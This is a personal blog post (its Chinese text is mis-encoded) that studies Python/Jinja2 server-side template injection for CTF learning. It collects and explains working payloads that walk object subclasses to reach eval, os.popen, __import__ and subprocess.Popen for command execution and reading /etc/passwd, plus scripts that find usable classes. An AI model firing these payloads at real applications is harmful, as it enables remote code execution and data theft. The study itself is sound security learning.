<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Python SSTIå­¦ä¹  | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Python SSTIå­¦ä¹  | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="å‰äººä¹‹è¿°å¤‡çŸ£Python SSTIæ¼æ´å­¦ä¹ æ€»ç»“ï¼Œè¿™é‡Œåªå­¦ä¹ ä¸€ä¸‹æ–‡ä¸­payloadçš„åŸç†ã€‚
èƒŒæ™¯çŸ¥è¯†
SSTI æ”»å‡»æ€è·¯

é€‰æ‹©ä¸€ä¸ªç±»ï¼Œå¦‚ï¼š'', [], {}
é€šè¿‡è¿™ä¸ªç±»æ‰¾åˆ°objectç±»ï¼Œè¿™æ˜¯ Python ä¸­æ‰€æœ‰ç±»çš„åŸºç±»ï¼š__base_..." />
    <meta name="keywords" content="SSTI,Python" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Python SSTIå­¦ä¹ 
            </h2>
            <div class="post-info">
              <span>
                2023-06-14
              </span>
              <span>
                13 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/h0Nu9_pAP/" class="post-tag">
                  # SSTI
                </a>
              
                <a href="https://skyblu3519.github.io/tag/c6PC98FOD/" class="post-tag">
                  # Python
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/python-ssti-xue-xi.jpeg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>å‰äººä¹‹è¿°å¤‡çŸ£<a href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTIæ¼æ´å­¦ä¹ æ€»ç»“</a>ï¼Œè¿™é‡Œåªå­¦ä¹ ä¸€ä¸‹æ–‡ä¸­payloadçš„åŸç†ã€‚</p>
<h1 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h1>
<h2 id="ssti-æ”»å‡»æ€è·¯">SSTI æ”»å‡»æ€è·¯</h2>
<ul>
<li>é€‰æ‹©ä¸€ä¸ªç±»ï¼Œå¦‚ï¼š<code>''</code>, <code>[]</code>, <code>{}</code></li>
<li>é€šè¿‡è¿™ä¸ªç±»æ‰¾åˆ°objectç±»ï¼Œè¿™æ˜¯ Python ä¸­æ‰€æœ‰ç±»çš„åŸºç±»ï¼š<code>__base__</code>ï¼Œ<code>__bases__</code>ï¼Œ<code>__mro__</code></li>
<li>é€šè¿‡objectç±»è·å–æ‰€æœ‰å­ç±»ï¼š<code>__subclasses__()</code></li>
<li>åœ¨å­ç±»åˆ—è¡¨ä¸­æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç±»</li>
<li>ç›´æ¥è°ƒç”¨ç±»ä¸‹é¢å‡½æ•°æˆ–ä½¿ç”¨è¯¥ç±»ç©ºé—´ä¸‹å¯ç”¨çš„å…¶ä»–æ¨¡å—çš„å‡½æ•°</li>
</ul>
<h2 id="python-é­”æœ¯æ–¹æ³•">Python é­”æœ¯æ–¹æ³•</h2>
<ul>
<li><strong><strong>init</strong></strong>: å¯¹è±¡çš„åˆå§‹åŒ–æ–¹æ³•</li>
<li><strong><strong>class</strong></strong>: è¿”å›å¯¹è±¡æ‰€å±çš„ç±»</li>
<li><strong><strong>module</strong></strong>: è¿”å›ç±»æ‰€åœ¨çš„æ¨¡å—</li>
<li><strong><strong>mro</strong></strong>: è¿”å›ç±»çš„è°ƒç”¨é¡ºåºï¼Œå¯ä»¥æ­¤æ‰¾åˆ°å…¶çˆ¶ç±»ï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰</li>
<li><strong><strong>base</strong></strong>: è·å–ç±»çš„ç›´æ¥çˆ¶ç±»ï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰</li>
<li><strong><strong>bases</strong></strong>: è·å–çˆ¶ç±»çš„å…ƒç»„ï¼ŒæŒ‰å®ƒä»¬å‡ºç°çš„å…ˆåæ’åºï¼ˆç”¨äºæ‰¾çˆ¶ç±»ï¼‰</li>
<li><strong><strong>dict</strong></strong>: è¿”å›å½“å‰ç±»çš„å‡½æ•°ã€å±æ€§ã€å…¨å±€å˜é‡ç­‰</li>
<li><strong><strong>subclasses</strong></strong>: è¿”å›æ‰€æœ‰ä»å¤„äºæ´»åŠ¨çŠ¶æ€çš„å¼•ç”¨çš„åˆ—è¡¨ï¼Œåˆ—è¡¨æŒ‰å®šä¹‰é¡ºåºæ’åˆ—ï¼ˆç”¨äºæ‰¾å­ç±»ï¼‰</li>
<li><strong><strong>globals</strong></strong>: è·å–å‡½æ•°æ‰€å±ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„æ¨¡å—ã€æ–¹æ³•åŠå˜é‡ï¼ˆç”¨äºè®¿é—®å…¨å±€å˜é‡ï¼‰</li>
<li><strong><strong>import</strong></strong>: ç”¨äºå¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—</li>
<li><strong><strong>builtins</strong></strong>: è¿”å›Pythonä¸­çš„å†…ç½®å‡½æ•°ï¼Œå¦‚eval</li>
</ul>
<h1 id="payloadåˆ†æ">Payloadåˆ†æ</h1>
<p>åœ¨ Python ä¸­ï¼Œobject æ˜¯æ‰€æœ‰ç±»çš„åŸºç±»ã€‚æ‰€æœ‰Pythonç±»ï¼Œæ— è®ºæ˜¯å†…ç½®çš„ï¼Œè¿˜æ˜¯ç”¨æˆ·å®šä¹‰çš„ï¼Œéƒ½ç»§æ‰¿è‡ªobjectç±»ã€‚æ‰€ä»¥ï¼Œå¤§å¤šæ•°SSTIçš„Payloadéƒ½ä¼šå…ˆè·å–åˆ°objectç±»ï¼Œåœ¨ä»objectçš„å­ç±»ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»ã€‚</p>
<pre><code class="language-python"># è·å–å­ç±»
''.__class__.__base__.__subclasses__()
''.__class__.__bases__[0].__subclasses__()
''.__class__.__mro__[-1].__subclasses__()
</code></pre>
<p>éœ€è¦æ³¨æ„çš„æ˜¯objectçš„å­ç±»åˆ—è¡¨çš„é¡ºåºå¯èƒ½ä¼šå›  Python ç¯å¢ƒã€ç‰ˆæœ¬ã€å·²å¯¼å…¥çš„æ¨¡å—ç­‰å¤šç§å› ç´ è€Œæœ‰æ‰€ä¸åŒã€‚å› æ­¤ï¼ŒSSTIçš„å¤§å¤šæ•°é¢˜ç›®éƒ½è¦ä»è·å–åˆ°å­ç±»åˆ—è¡¨å¼€å§‹ã€‚</p>
<p>åœ¨æ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œä»¥åŠè¿™äº›ç±»çš„åˆ©ç”¨æ–¹æ³•ï¼š</p>
<pre><code class="language-python"># å¯ä»¥åˆ©ç”¨çš„ç±»
userful_class = ['linecache', 'os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec']


# åˆ©ç”¨warnings.catch_warningsé…åˆ__builtins__å¾—åˆ°evalå‡½æ•°ï¼Œç›´æ¥æ¢­å“ˆï¼ˆå¸¸ç”¨ï¼‰
{{[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)}}

# åˆ©ç”¨os._wrap_closeç±»æ‰€å±ç©ºé—´ä¸‹å¯ç”¨çš„popenå‡½æ•°è¿›è¡ŒRCEçš„payload
{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

# åˆ©ç”¨subprocess.Popenç±»è¿›è¡ŒRCEçš„payload
{{''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# åˆ©ç”¨__import__å¯¼å…¥osæ¨¡å—è¿›è¡Œåˆ©ç”¨
{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}

# åˆ©ç”¨linecacheç±»æ‰€å±ç©ºé—´ä¸‹å¯ç”¨çš„osæ¨¡å—è¿›è¡ŒRCEçš„payloadï¼Œå‡è®¾linecacheä¸ºç¬¬250ä¸ªå­ç±»
{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
{{[].__class__.__base__.__subclasses__()[250].__init__.func_globals['linecache'].__dict__.['os'].popen('whoami').read()}}

# åˆ©ç”¨fileç±»ï¼ˆpython3å°†fileç±»åˆ é™¤äº†ï¼Œå› æ­¤åªæœ‰python2å¯ç”¨ï¼‰è¿›è¡Œæ–‡ä»¶è¯»
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').readlines()}}
# åˆ©ç”¨fileç±»è¿›è¡Œæ–‡ä»¶å†™ï¼ˆpython2çš„strç±»å‹ä¸ç›´æ¥ä»å±äºå±äºåŸºç±»ï¼Œæ‰€ä»¥è¦ä¸¤æ¬¡ .__bases__ï¼‰
{{&quot;&quot;.__class__.__bases[0]__.__bases__[0].__subclasses__()[40]('/tmp').write('test')}}

# é€šç”¨getshellï¼Œéƒ½æ˜¯é€šè¿‡__builtins__è°ƒç”¨evalè¿›è¡Œä»£ç æ‰§è¡Œ
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;) }}{% endif %}{% endfor %}
# è¯»å†™æ–‡ä»¶ï¼Œé€šè¿‡__builtins__è°ƒç”¨openè¿›è¡Œæ–‡ä»¶è¯»å†™
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
</code></pre>
<p>ä¸‹é¢å¯¹è¿™äº›Payloadä¾æ¬¡è¿›è¡Œåˆ†æ</p>
<h2 id="__builtins__çš„eval">__builtins__çš„eval</h2>
<p><code>__builtins__</code> æ˜¯ Python ä¸­çš„ä¸€ä¸ªå†…ç½®æ¨¡å—ï¼Œå®ƒå­˜åœ¨äºæ‰€æœ‰ Python ç¯å¢ƒä¸­ã€‚è¿™ä¸ªæ¨¡å—åŒ…å«äº†å¾ˆå¤šåŸºæœ¬çš„å†…ç½®å‡½æ•°å’Œç±»ï¼Œä¾‹å¦‚<code>len()</code>, <code>print()</code>, <code>int()</code>, <code>list()</code>, <code>dict()</code> ç­‰ã€‚åœ¨SSTIçš„RCEä¸­ï¼Œæ‰€è¦åˆ©ç”¨çš„å°±æ˜¯å…¶ä¸­çš„<code>eval()</code>å‡½æ•°ã€‚</p>
<p>è§‚å¯Ÿä¸Šé¢çš„payloadæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåˆ©ç”¨<code>__builtins__</code>çš„<code>eval()</code>å‡½æ•°çš„æ ¼å¼ä¸ºï¼š<code>__init__.__globals__['__builtins__'].eval()</code>ï¼Œè¿™ä¸ªpayload çš„æ„æ€æ˜¯ä»ä¸€ä¸ªå­ç±»<code>__init__</code>æ–¹æ³•çš„<code>__globals__</code>å±æ€§ä¸­è·å–åˆ°<code>__builtins__</code>ï¼Œå†è°ƒç”¨<code>__builtins__</code>çš„<code>eval()</code>ã€‚</p>
<p>å› ä¸º<code>__globals__</code>åŒ…å«äº†å‡½æ•°å®šä¹‰æ—¶çš„å…¨å±€å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰ä¿¡æ¯ã€‚ï¼Œè€Œ<code>__builtins__</code>æ˜¯é»˜è®¤å¯¼å…¥çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™æ ·çš„æ–¹å¼è·å–åˆ°ã€‚ä¸‹é¢çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<pre><code class="language-python"># test.py
import math
flag = 'skkyblu3'

class A:
    def __init__(self):
        self.a = 1

    def func(self):
        pass


def display(d: dict):       # ç”¨æ¥
    for k, v in d.items():
        print(f'{k}: {v}')


display(A.__init__.__globals__)

# è¾“å‡ºçš„ç»“æœå¦‚ä¸‹
# __name__: __main__
# __doc__: None
# __package__: None
# __loader__: &lt;_frozen_importlib_external.SourceFileLoader object at 0x104910c40&gt;
# __spec__: None
# __annotations__: {}
# __builtins__: &lt;module 'builtins' (built-in)&gt;
# __file__: /Users/ea5ter/Documents/CTF/code/py/ssti/test/test.py
# __cached__: None
# math: &lt;module 'math' from '/Users/ea5ter/.pyenv/versions/3.8.11/lib/python3.8/lib-dynload/math.cpython-38-darwin.so'&gt;
# flag: skkyblu3
# A: &lt;class '__main__.A'&gt;
# display: &lt;function display at 0x10495e160&gt;
</code></pre>
<p>å…¶ä¸­å°±æœ‰<code>__builtins__</code>è¿™ä¸ªæ¨¡å—ï¼Œç„¶åå°±å¯ä»¥åƒpayloadä¸­é‚£æ ·ä½¿ç”¨<code>eval</code>æ‰§è¡Œä»£ç ï¼š<code>A.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)</code></p>
<p>æ—¢ç„¶<code>__globals__</code>è¾“å‡ºçš„æ˜¯å…¨å±€å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå…¶ä»–å‡ ä¸ªå‡½æ•°çš„<code>__globals__</code>å±æ€§ä¹Ÿæ˜¯å¯ä»¥ä¸€æ ·çš„ï¼Œå¯¹äºè¿™ä¸ªä»£ç ä¸‹é¢çš„payloadä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š</p>
<pre><code class="language-python">A.func.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)   # Aä¸­çš„funcå‡½æ•°
display.__globals__['__builtins__'].eval(&quot;__import__('os').popen('whoami').read()&quot;)   # displayå‡½æ•°
</code></pre>
<p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼Œå› ä¸º<code>A.func.__globals__['__builtins__']</code>è¿”å›çš„æ˜¯<code>__builtins__</code><strong>æ¨¡å—</strong>ï¼Œ<code>A.func.__globals__['__builtins__'].eval</code>æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªæ¨¡å—ä¸‹çš„æ–¹æ³•ï¼Œæ‰€ä»¥è¿™ç§è°ƒç”¨æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼š<br>
<img src="https://skyblu3519.github.io/post-images/1686897715609.png" alt="" loading="lazy"></p>
<p>ä½†æ˜¯ï¼Œå¦‚æœåœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­è°ƒç”¨ï¼Œ<code>A.func.__globals__['__builtins__']</code>å°±ä¸å†æ˜¯ä¸€ä¸ª<strong>æ¨¡å—</strong>è€Œæ˜¯ä¸€ä¸ª<strong>å­—å…¸</strong>ï¼Œå¯¹äºä¸€ä¸ªå­—å…¸è¦è°ƒç”¨<code>eval()</code>å‡½æ•°ï¼Œpayladå°±å˜æˆäº†<code>A.func.__globals__['__builtins__']['eval']</code>ï¼š</p>
<pre><code class="language-python">import test

print(type(test.display.__globals__['__builtins__']))
print(type(test.display.__globals__['__builtins__']['eval']))
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686898035913.png" alt="" loading="lazy"></figure>
<p>é€ æˆè¿™æ ·çš„è¯¦ç»†åŸå› å¯èƒ½æ¶‰åŠåˆ°ä¸€äº›pythonçš„åº•å±‚ï¼Œä¹Ÿå°±ä¸å¤ªæ·±ç©¶äº†ã€‚æ€»ä¹‹ï¼Œç»“è®ºå°±æ˜¯ï¼šæ–‡ä»¶æ˜¯åœ¨è¢«ç›´æ¥æ‰§è¡Œçš„ç¯å¢ƒä¸­<code>__builtins__</code>é€šå¸¸è¢«Pythonè§£é‡Šå™¨è®¾ç½®ä¸ºbuiltinsæ¨¡å—ï¼›è€Œå®ƒä½œä¸ºä¸€ä¸ªæ¨¡å—å¯¼å…¥ä½¿ç”¨çš„æ—¶å€™ï¼Œå®ƒçš„ä¸Šä¸‹æ–‡ç¯å¢ƒå‘ç”Ÿæ”¹å˜ï¼Œ<code>__builtins__</code>ä¼šè¢«è®¾ç½®ä¸ºä¸€ä¸ªå­—å…¸ï¼Œè¿™ä¸ªå­—å…¸åŒ…å«äº†builtinsæ¨¡å—çš„æ‰€æœ‰å†…å®¹ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1686898685902.png" alt="" loading="lazy"></p>
<p>ä½†æ˜¯æ–‡ç« ä¸­çš„payloadç”¨<code>.eval</code>çš„çš„è°ƒç”¨æ–¹å¼ä¾ç„¶æ˜¯æœ‰æ•ˆçš„ï¼Œä¹Ÿè®¸å’ŒJinja2çš„æ²™ç›’ç¯å¢ƒæœ‰å…³ğŸ¤”<br>
<img src="https://skyblu3519.github.io/post-images/1686899196632.png" alt="" loading="lazy"></p>
<p>åœ¨çŸ¥é“è¿™ç§payloadçš„é€»è¾‘åï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹objectçš„å­ç±»ä¸­è¿˜æœ‰æ²¡æœ‰å…¶ä»–å¯ä»¥åˆ©ç”¨ç±»ï¼š</p>
<pre><code class="language-python">import importlib

def check_class_builtins(class_full_names):
    for class_full_name in class_full_names:
        try:
            module_name, class_name = class_full_name.rsplit('.', 1)

            # åŠ¨æ€å¯¼å…¥æ¨¡å—
            module = importlib.import_module(module_name)
            # ä»æ¨¡å—è·å–ç±»
            cls = getattr(module, class_name)

            init_globals = getattr(cls.__init__, '__globals__', None)
            if init_globals is None:
                # print(f&quot;{class_full_name}.__init__ does not have __globals__.&quot;)
                continue

            builtins_type = type(init_globals.get('__builtins__', None))
            print(f&quot;{class_full_name}.__init__.__globals__['__builtins__'] is {builtins_type}.&quot;)

        except Exception as e:
            pass
            # print(f&quot;Error while processing {class_full_name}: {e}&quot;)


subclass_names = [f&quot;{cls.__module__}.{cls.__name__}&quot; for cls in object.__subclasses__()]
# print(subclass_names)
check_class_builtins(subclass_names)
</code></pre>
<p>å¯ä»¥çœ‹åˆ°é™¤äº†<code>warnings.catch_warnings</code>è¿˜æœ‰ä¸å°‘å¯ä»¥åƒè¿™æ ·<code>.__init__.__globals__['__builtins__']</code>åˆ©ç”¨çš„ç±»ï¼š</p>
<pre><code class="language-python">_frozen_importlib._ModuleLock.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib._DummyModuleLock.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib._ModuleLockManager.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib.ModuleSpec.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib_external.FileLoader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib_external._NamespacePath.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib_external._NamespaceLoader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_frozen_importlib_external.FileFinder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
zipimport.zipimporter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
zipimport._ZipImportResourceReader.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
codecs.IncrementalEncoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
codecs.IncrementalDecoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
codecs.StreamReaderWriter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
codecs.StreamRecoder.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
os._wrap_close.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_sitebuiltins.Quitter.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
_sitebuiltins._Printer.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
types.DynamicClassAttribute.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
types._GeneratorWrapper.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
warnings.WarningMessage.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
warnings.catch_warnings.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
reprlib.Repr.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
functools.partialmethod.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
functools.singledispatchmethod.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
functools.cached_property.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
contextlib._GeneratorContextManagerBase.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
contextlib._BaseExitStack.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
test.A.__init__.__globals__['__builtins__'] is &lt;class 'dict'&gt;.
</code></pre>
<h2 id="ospopen">os.popen</h2>
<p>osæ¨¡å—ä¸‹çš„popenå‡½æ•°å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p><code>os._wrap_close</code>è¿™ä¸ªç±»æ˜¯åœ¨osæ¨¡å—ä¸­çš„ï¼Œæ‰€ä»¥åƒä¸Šé¢é‚£æ ·ï¼Œåœ¨å®ƒçš„å…¨å±€ç¯å¢ƒä¸­æ‰¾åˆ°<code>Popen</code>è°ƒç”¨å³å¯ã€‚</p>
<p>å¯¹åº”çš„Payloadä¸ºï¼š</p>
<pre><code class="language-python">{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
{{&quot;&quot;.__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
</code></pre>
<h2 id="__import__">__import__()</h2>
<p><code>__import__</code> æ˜¯ Python çš„ä¸€ä¸ª<strong>å†…ç½®å‡½æ•°</strong>ï¼Œç”¨äºåŠ¨æ€åœ°å¯¼å…¥æ¨¡å—ã€‚å®ƒæä¾›äº†ä¸€ç§åœ¨è¿è¡Œæ—¶æ ¹æ®å­—ç¬¦ä¸²å½¢å¼çš„æ¨¡å—åå¯¼å…¥æ¨¡å—çš„æ–¹å¼ã€‚</p>
<p>åœ¨ä¸Šé¢çš„Payloadä¸­é€šè¿‡å¯¼å…¥<code>os</code>æ¨¡å—æ‰§è¡Œ<code>popen</code>ã€‚</p>
<pre><code class="language-python">{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
</code></pre>
<p>æ•´ä¸ªæ ¼å¼ä¹Ÿå·®ä¸å¤šï¼Œä¸è¿‡è¿™é‡Œæ²¡è¯´æ‰€ç”¨çš„è¿™ä¸ªç±»æ˜¯ä»€ä¹ˆã€‚ç”¨è„šæœ¬æœç´¢ä¸€ä¸‹<code>__globals__</code>ä¸­å­˜åœ¨<code>__import__</code>çš„ç±»ï¼Œä¸€å…±æœ‰å››ä¸ª<code>_frozen_importlib._ModuleLock</code>ã€<code>_frozen_importlib._DummyModuleLock</code>ã€<code>_frozen_importlib._ModuleLockManager</code>ã€<code>_frozen_importlib.ModuleSpec</code>ï¼š<br>
<img src="https://skyblu3519.github.io/post-images/1687264365978.png" alt="" loading="lazy"></p>
<p>è¿™é‡Œè¿˜å­¦åˆ°äº†ä¸ªç‚¹ï¼Œå°±æ˜¯å½“ä½ è¯•å›¾è®¿é—®ä¸€ä¸ªå˜é‡æ—¶ï¼ŒPythonè§£é‡Šå™¨ä¼šé¦–å…ˆåœ¨å½“å‰çš„<strong>å±€éƒ¨å‘½åç©ºé—´</strong>å¯»æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå°±ä¼šå»<strong>å…¨å±€å‘½åç©ºé—´</strong>å¯»æ‰¾ï¼Œå¦‚æœè¿˜æ‰¾ä¸åˆ°ï¼Œå°±ä¼šå»<strong>å†…ç½®å‘½åç©ºé—´</strong>å¯»æ‰¾ã€‚è¿™å°±æ˜¯æ‰€è°“çš„LEGBè§„åˆ™ï¼ˆLocal -&gt; Enclosed -&gt; Global -&gt; Built-inï¼‰ã€‚</p>
<p>æ‰€ä»¥ä¸Šé¢é‚£å››ä¸ªç±»å®ƒä»¬æ˜¯åœ¨<strong>å…¨å±€å‘½åç©ºé—´</strong>ä¸­æ³¨å†Œäº†<code>__import__</code> å‡½æ•°çš„ã€‚</p>
<p>ä¸è¿‡æ—¢ç„¶<code>__import__</code>æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨<code>__builtins__</code>ä¸­æ‰¾åˆ°ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥åƒè¿™æ ·è°ƒç”¨ï¼š</p>
<pre><code class="language-python"># Aä¸ºä»»ä½•ä¸€ä¸ªå…¨å±€å‘½åç©ºé—´ä¸­å­˜åœ¨__builtins__æ¨¡å—çš„ç±»
A.__globals__.__builtins__.__import__('os').popen('whoami').read()
</code></pre>
<h2 id="subprocesspopen">subprocess.Popen</h2>
<p><code>subprocess</code>ä¸‹çš„<code>Popen</code>ç±»ä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸ä¹‹å‰æ–¹æ³•æœ‰æ‰€åŒºåˆ«çš„æ˜¯<code>Popen</code>æ˜¯ä¸€ä¸ªç±»ã€‚</p>
<pre><code class="language-python">{{subprocess.Popen('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
</code></pre>
<p><code>subprocess.Popen('whoami', shell=True, stdout=-1)</code>åˆ›å»ºå¹¶å¯åŠ¨äº†ä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ¥æ‰§è¡Œ 'whoami' å‘½ä»¤ã€‚å…¶ä¸­ï¼š</p>
<ul>
<li><code>shell=True</code>ï¼šè¿™ä¸ªå‚æ•°å…è®¸æˆ‘ä»¬é€šè¿‡ <code>shell</code> æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li>
<li><code>stdout=-1</code>ï¼šè¿™ä¸ªå‚æ•°æ„å‘³ç€å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè¢«é‡å®šå‘åˆ°ä¸€ä¸ªç®¡é“ä¸­ã€‚<code>-1</code> å’Œ <code>subprocess.PIPE</code> çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯é‡å®šå‘åˆ°ä¸€ä¸ªç®¡é“ã€‚</li>
<li><code>communicate()</code> æ–¹æ³•æ˜¯ <code>Popen</code> å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒç”¨äºä¸å­è¿›ç¨‹äº¤äº’ã€‚æ— å‚æ•°è°ƒç”¨æ—¶ï¼Œå®ƒä¼šç­‰å¾…å­è¿›ç¨‹å®Œæˆï¼Œç„¶åè¿”å›ä¸€ä¸ªåŒ…å«å­è¿›ç¨‹ <code>stdout</code> å’Œ <code>stderr</code> è¾“å‡ºçš„å…ƒç»„ã€‚</li>
<li><code>[0]</code> æ˜¯è·å–å…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³å­è¿›ç¨‹çš„ <code>stdout</code> è¾“å‡ºã€‚</li>
<li><code>strip() </code>ç”¨äºç§»é™¤å­—ç¬¦ä¸²å¤´å°¾çš„ç©ºæ ¼å’Œæ¢è¡Œç¬¦ã€‚</li>
</ul>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å‰©ä½™çš„Payloadä¸­è¯´åˆ°äº†ä¸€ä¸ª<code>linecache</code>ç±»ï¼Œä½†è¿™ä¸ª<code>linecache</code>åœ¨pythonä¸­æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œå¹¶ä¸æ˜¯objectçš„å­ç±»ï¼Œä¹‹åé‡åˆ°å†è¯´å§ã€‚</p>
<p>è´´ä¸€ä¸‹åœ¨<code>__globals__</code>ä¸­æ‰¾æœ‰ç”¨ä¸œè¥¿çš„ä»£ç ï¼š</p>
<pre><code class="language-python">import importlib


